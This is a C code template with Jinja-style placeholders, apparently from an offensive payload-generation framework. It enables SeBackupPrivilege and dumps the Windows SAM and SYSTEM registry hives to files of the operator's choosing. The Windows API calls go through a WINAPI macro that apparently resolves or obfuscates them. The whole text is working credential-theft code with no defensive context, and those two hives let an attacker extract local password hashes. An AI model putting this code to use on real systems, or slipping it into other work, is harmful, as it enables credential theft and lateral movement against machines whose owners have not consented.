HANDLE hToken = NULL;
TOKEN_PRIVILEGES tp;
LUID luid;
HKEY hSam = NULL;
HKEY hSystem = NULL;

if (!{{ WINAPI("OpenProcessToken") }}(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    return;

if (!{{ WINAPI("LookupPrivilegeValueW") }}(NULL, L"SeBackupPrivilege", &luid))
    goto cleanup;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
{{ WINAPI("AdjustTokenPrivileges") }}(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
if (GetLastError() != ERROR_SUCCESS) goto cleanup;

{{ WINAPI("CreateDirectoryW") }}(L"{{ sam_output }}\\..", NULL);

if ({{ WINAPI("RegOpenKeyExW") }}(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hSam) == ERROR_SUCCESS) {
    DeleteFileW(L"{{ sam_output }}");
    {{ WINAPI("RegSaveKeyExW") }}(hSam, L"{{ sam_output }}", NULL, REG_LATEST_FORMAT);
}

if ({{ WINAPI("RegOpenKeyExW") }}(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem) == ERROR_SUCCESS) {
    DeleteFileW(L"{{ system_output }}");
    {{ WINAPI("RegSaveKeyExW") }}(hSystem, L"{{ system_output }}", NULL, REG_LATEST_FORMAT);
}

cleanup:
if (hSam) {{ WINAPI("RegCloseKey") }}(hSam);
if (hSystem) {{ WINAPI("RegCloseKey") }}(hSystem);
if (hToken) CloseHandle(hToken);
